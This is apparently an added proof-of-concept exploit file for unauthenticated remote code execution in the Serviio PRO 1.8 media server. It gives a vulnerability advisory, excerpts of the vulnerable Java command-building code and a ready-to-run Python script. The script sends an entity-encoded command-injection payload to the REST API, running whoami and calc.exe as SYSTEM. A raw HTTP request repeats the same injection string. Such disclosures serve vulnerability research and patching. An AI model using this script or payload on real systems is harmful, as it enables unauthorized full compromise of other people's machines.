@@ -1,0 +1,156 @@
+#!/usr/bin/env python
+#
+#
+# Serviio PRO 1.8 DLNA Media Streaming Server REST API Arbitrary Code Execution
+#
+#
+# Vendor: Petr Nejedly | Six Lines Ltd
+# Product web page: http://www.serviio.org
+# Affected version: 1.8.0.0 PRO, 1.7.1, 1.7.0, 1.6.1
+#
+# Summary: Serviio is a free media server. It allows you to stream your media
+# files (music, video or images) to renderer devices (e.g. a TV set, Bluray player,
+# games console or mobile phone) on your connected home network.
+#
+# Desc: The version of Serviio installed on the remote Windows host is affected by
+# an unauthenticated remote code execution vulnerability due to improper access control
+# enforcement of the Configuration REST API and unsanitized input when FFMPEGWrapper
+# calls cmd.exe to execute system commands. A remote attacker can exploit this with a
+# simple JSON request, gaining system access with SYSTEM privileges via a specially
+# crafted request and escape sequence.
+#
+# =================================================================================
+# org/serviio/ui/resources/server/ActionsServerResource.java:
+# -----------------------------------------------------------
+#
+#    private ResultRepresentation checkStreamUrl(ActionRepresentation representation) {
+#        this.validateParameters(representation, 2);
+#        try {
+#            MediaFileType fileType = MediaFileType.valueOf(representation.getParameters().get(0));
+#            String url = StringUtils.trim(representation.getParameters().get(1));
+#            LocalItemMetadata md = MetadataFactory.getMetadataInstance(fileType);
+#            DeliveryContext context = fileType == MediaFileType.VIDEO ? new VideoDeliveryContext(false, null) : new AudioDeliveryContext(false, null);
+#            FFmpegMetadataRetriever.retrieveOnlineMetadata(md, url, context);
+#            return this.responseOk();
+#        }
+#        catch (InvalidMediaFormatException e) {
+#            return this.responseOk(603);
+#        }
+#
+# =================================================================================
+# serviio.jar / external / ProcessExecutor.java:
+# ----------------------------------------------
+#
+#    private Map<String, String> createWindowsRuntimeEnvironmentVariables() {
+#        HashMap<String, String> newEnv = new HashMap<String, String>();
+#        newEnv.putAll(System.getenv());
+#        ProcessExecutorParameter[] i18n = new ProcessExecutorParameter[this.commandArguments.length + 2];
+#        i18n[0] = new ProcessExecutorParameter("cmd");
+#        i18n[1] = new ProcessExecutorParameter("/C");
+#        for (int counter = 0; counter < this.commandArguments.length; ++counter) {
+#            ProcessExecutorParameter argument = this.commandArguments[counter];
+#            String envName = "JENV_" + counter;
+#            i18n[counter + 2] = new ProcessExecutorParameter("%" + envName + "%");
+#            boolean quotesNeededForWindows = this.quotesNeededForWindows(argument);
+#            if (!quotesNeededForWindows) {
+#                argument = new ProcessExecutorParameter(this.escapeAmpersandForWindows(argument.getValue()));
+#            }
+#            newEnv.put(envName, this.wrapInQuotes(argument, quotesNeededForWindows));
+#        }
+#        this.commandArguments = i18n;
+#        String[] tempPath = FileUtils.splitFilePathToDriveAndRest(System.getProperty("java.io.tmpdir"));
+#        newEnv.put("HOMEDRIVE", tempPath[0]);
+#        newEnv.put("HOMEPATH", tempPath[1]);
+#        newEnv.putAll(this.createFontConfigRuntimeEnvironmentVariables());
+#        if (log.isTraceEnabled()) {
+#            log.trace(String.format("Env variables: %s", newEnv.toString()));
+#        }
+#        return newEnv;
+#    }
+#
+#    private String wrapInQuotes(ProcessExecutorParameter argument, boolean quotesNeeded) {
+#        return (quotesNeeded ? "\"" : "") + argument + (quotesNeeded ? "\"" : "");
+#    }
+#
+#    protected boolean quotesNeededForWindows(ProcessExecutorParameter argument) {
+#        boolean quotesNeeded = argument.getValue().indexOf(" ") > -1;
+#        return quotesNeeded;
+#    }
+#
+#    private String escapeAmpersandForWindows(String value) {
+#        return value.replaceAll("&", "^&");
+#    }
+#
+# =================================================================================
+#
+# Tested on: Restlet-Framework/2.2
+#            Windows 7, UPnP/1.0 DLNADOC/1.50, Serviio/1.8
+#            Java/1.8.0_121
+#            Java/1.8.0_111
+#            Java/1.8.0_91
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2017-5408
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5408.php
+#
+# SSD Advisory: https://blogs.securiteam.com/index.php/archives/3094
+#
+#
+# 12.12.2016
+#
+
+
+#
+# The PoC will create a file testingus3.txt in 'C:\Program Files\Serviio\bin' with whoami
+# output in it and start a calc.exe child process as nt authority\system.
+#
+
+from urllib2 import Request, urlopen
+import sys
+
+if (len(sys.argv) <= 1):
+        print '[*] Usage: serviio_rce.py <ip address>'
+        exit(0)
+
+host = sys.argv[1]
+
+values = """
+<action>
+    <name>checkStreamUrl</name>
+    <parameter>VIDEO</parameter>
+    <parameter>1.2.3.4&#x27;&#x5c;"&#x60;&&#x77;&#x68;&#x6f;&#x61;&#x6d;&#x69;&#x20;>&#x74;&#x65;&#x73;&#x74;&#x69;&#x6e;&#x67;&#x75;&#x73;&#x33;&#x2e;&#x74;&#x78;&#x74;&&&#x63;&#x61;&#x6c;&#x63;&&#x60;&#x27;</parameter>
+</action>"""
+
+headers = {
+  'Content-Type': 'application/xml',
+  'Accept': 'application/xml'
+}
+request = Request('http://'+host+':23423/rest/action', data=values, headers=headers)
+
+response_body = urlopen(request).read()
+print response_body
+
+
+'''
+Raw request:
+
+POST /rest/action HTTP/1.1
+Host: 10.211.55.3:23423
+Content-Length: 93
+Accept: application/json, text/plain, */*
+Origin: http://10.211.55.3:23423
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36
+Content-Type: application/json;charset=UTF-8
+Referer: http://10.211.55.3:23423/console/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+DNT: 1
+Connection: close
+
+{"name":"checkStreamUrl","parameter":["VIDEO","1.2.3.4'\"`&whoami >testingus3.txt&&calc&`'"]}
+
+'''
